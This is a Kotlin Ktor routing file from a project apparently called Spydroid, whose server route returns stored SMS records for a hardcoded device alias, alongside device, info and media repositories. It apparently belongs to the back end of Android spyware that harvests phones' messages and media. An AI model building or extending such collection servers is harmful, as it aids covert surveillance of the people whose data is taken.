/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.server.plugins

import io.ktor.server.application.*
import io.ktor.server.response.*
import io.ktor.server.routing.*
import net.spydroid.server.domain.DevicesRepository
import net.spydroid.server.domain.InfoRepository
import net.spydroid.server.domain.MultimediaRepository
import net.spydroid.server.domain.SmsRepository
import org.koin.ktor.ext.inject


private object Routes {
    const val USERS = "/usuarios"
}

fun Application.configureRouting() {


    val devicesRepository: DevicesRepository by inject()
    val infoRepository: InfoRepository by inject()
    val multimediaRepository: MultimediaRepository by inject()
    val smsRepository: SmsRepository by inject()

    routing {
        get(Routes.USERS) {
            val ALIAS = "JUAN_KARLOS"
            val devices = devicesRepository.filerWithAlias(ALIAS)
            val info = infoRepository.filerWithAlias(ALIAS)
            val multimedia = multimediaRepository.filerWithAlias(ALIAS)
            val sms = smsRepository.filerWithAlias(ALIAS)
            call.respond(sms)
        }
    }
}

